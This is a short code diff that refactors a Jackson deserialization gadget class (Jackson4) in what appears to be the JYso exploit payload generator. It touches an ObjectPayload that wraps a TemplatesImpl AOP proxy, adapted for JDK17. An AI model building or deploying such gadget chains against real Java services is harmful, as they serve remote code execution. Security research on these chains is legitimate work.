@@ -12,10 +12,11 @@ import javassist.CtMethod;
 import java.util.HashMap;
 
 import static com.qi4l.JYso.gadgets.Jackson3.makeTemplatesImplAopProxy;
-import static com.qi4l.JYso.gadgets.utils.Utils.makeMap;
 
 
 //Jackson1链的JDK17改造
+
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"spring-apo:6.2.10"})
 @Authors({Authors.QI4L})
 public class Jackson4 implements ObjectPayload<Object> {
@@ -38,7 +39,6 @@ public class Jackson4 implements ObjectPayload<Object> {
         map1.put("zZ", xString);
         map2.put("yy", xString);
         map2.put("zZ", node);
-        HashMap hashmap = makeMap(map1, map2);
-        return hashmap;
+        return com.qi4l.JYso.gadgets.utils.Utils.makeMap(map1, map2);
     }
 }
